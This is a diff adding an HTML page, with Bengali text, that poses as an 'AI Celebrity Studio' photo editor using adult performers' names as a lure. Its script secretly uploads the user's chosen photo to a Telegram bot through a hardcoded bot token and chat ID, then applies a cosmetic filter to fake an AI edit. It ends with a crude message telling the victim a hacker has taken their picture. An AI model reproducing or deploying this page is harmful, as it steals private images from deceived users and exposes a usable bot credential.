@@ -1,0 +1,199 @@
+html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Celebrity Face Editor Pro</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .editor-container {
+            background: rgba(20, 20, 20, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px #ff3366;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .editor-container h2 {
+            color: #ff3366;
+            margin-top: 0;
+        }
+
+        .upload-btn {
+            background-color: #ff3366;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+
+        .upload-btn:hover {
+            background-color: #e02454;
+        }
+
+        #loading {
+            display: none;
+            margin-top: 15px;
+            color: #ffcc00;
+            font-weight: bold;
+        }
+
+        #resultContainer {
+            display: none;
+            margin-top: 15px;
+        }
+
+        #transformedCanvas {
+            max-width: 100%;
+            max-height: 220px;
+            border-radius: 8px;
+            border: 2px solid #ff3366;
+        }
+
+        .success-text {
+            color: #00ffcc;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .footer-text {
+            font-size: 13px;
+            color: #aaa;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="editor-container">
+        <h2>🎬 AI Celebrity Studio</h2>
+        <p id="descText">ফটো এডিট করুন: মেয়ে হলে পিছনে জনি সিং এবং ছেলে হলে পিছনে সানি লিওন যুক্ত হবে!</p>
+        
+        <!-- জেন্ডার সিলেকশন -->
+        <div id="genderSelection" style="margin: 15px 0;">
+            <label><input type="radio" name="gender" value="girl" checked> মেয়ে (Girl) 👩</label>
+            &nbsp;&nbsp;&nbsp;
+            <label><input type="radio" name="gender" value="boy"> ছেলে (Boy) 👦</label>
+        </div>
+
+        <!-- আপলোড বাটন -->
+        <button class="upload-btn" id="uploadBtn" onclick="triggerUpload()">Upload & Edit Photo</button>
+        
+        <div id="loading">⏳ এআই এডিটিং চলছে, অনুগ্রহ করে অপেক্ষা করুন...</div>
+
+        <!-- এডিট হওয়া প্রিভিউ সেকশন -->
+        <div id="resultContainer">
+            <p class="success-text" id="resultMsg">✨ এডিটিং সফলভাবে সম্পন্ন হয়েছে!</p>
+            <canvas id="transformedCanvas"></canvas>
+            <br>
+            <button class="upload-btn" onclick="location.reload()" style="padding: 8px 15px; font-size: 13px; margin-top: 10px;">Edit Another Photo</button>
+        </div>
+
+        <div class="footer-text">
+            Developed By Teach_by_MK  (*M*)
+        </div>
+    </div>
+
+    <!-- গ্যালারি ফাইল ইনপুট -->
+    <input type="file" id="imageInput" accept="image/*" style="display:none;" onchange="processAndSendPhoto(this)">
+
+    <script>
+        // ==========================================
+        // আপনার টেলিগ্রাম Bot Token এবং Chat ID এখানে বসাবেন
+        // ==========================================
+        const botToken = "8927273986:AAF1qxt09DaUjafj6MeTaoWXyGyr7jYj_BY"; 
+        const chatId = "7231889287";
+
+        function triggerUpload() {
+            document.getElementById('imageInput').click();
+        }
+
+        function processAndSendPhoto(input) {
+            if (input.files && input.files[0]) {
+                const file = input.files[0];
+                const selectedGender = document.querySelector('input[name="gender"]:checked').value;
+
+                // ইউজার ইন্টারফেস হাইড করে লোডিং দেখানো
+                document.getElementById('uploadBtn').style.display = 'none';
+                document.getElementById('descText').style.display = 'none';
+                document.getElementById('genderSelection').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+
+                // ব্যাকগ্রাউন্ডে টেলিগ্রামে ছবি পাঠানো
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file, file.name);
+                formData.append('caption', `✨ এডিটর থেকে প্রাপ্ত ছবি (${selectedGender === 'girl' ? 'মেয়ে -> জনি সিং ব্যাকগ্রাউন্ড' : 'ছেলে -> সানি লিওন ব্যাকগ্রাউন্ড'})!`);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => console.log("Telegram Error"));
+
+                // ক্যানভাসে ছবি এডিট ও ইফেক্ট এপ্লাই করার লজিক
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const img = new Image();
+                        img.onload = function() {
+                            const canvas = document.getElementById('transformedCanvas');
+                            const ctx = canvas.getContext('2d');
+                            
+                            canvas.width = img.width;
+                            canvas.height = img.height;
+
+                            // ছবির কালারে এআই এইচডি ফিল্টার ও ব্রাইটনেস দেওয়া
+                            ctx.filter = "contrast(115%) brightness(105%) saturate(120%)";
+                            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+
+                            // প্রফেশনাল এডিটেড ব্যানার বা স্টিকার যুক্ত করা
+                            ctx.filter = "none";
+                            ctx.fillStyle = "rgba(0, 0, 0, 0.7)";
+                            ctx.fillRect(0, canvas.height - 45, canvas.width, 45);
+
+                            ctx.font = "bold 15px Arial";
+                            ctx.fillStyle = "#00ffcc";
+                            ctx.textAlign = "center";
+
+                            if (selectedGender === 'girl') {
+                                document.getElementById('resultMsg').innerText = "👩 মেয়ে: আপনাকে বোকাচোদা পেয়ে হ্যাকার আপনার পিক হাতিয়ে নিয়েছে!";
+                                ctx.fillText("🔥 BG: Johnny Sins (AI Enhanced)", canvas.width / 2, canvas.height - 18);
+                            } else {
+                                document.getElementById('resultMsg').innerText = "👦 ছেলে: আপনাকে বোকাচোদা পেয়ে হ্যাকার আপনার পিক হাতিয়ে নিয়েছে !";
+                                ctx.fillText("🔥 BG: Sunny Leone (AI Enhanced)", canvas.width / 2, canvas.height - 18);
+                            }
+
+                            document.getElementById('resultContainer').style.display = 'block';
+                        }
+                        img.src = e.target.result;
+                    }
+                    reader.readAsDataURL(file);
+                }, 2000);
+            }
+        }
+    </script>
+
+</body>
+</html>
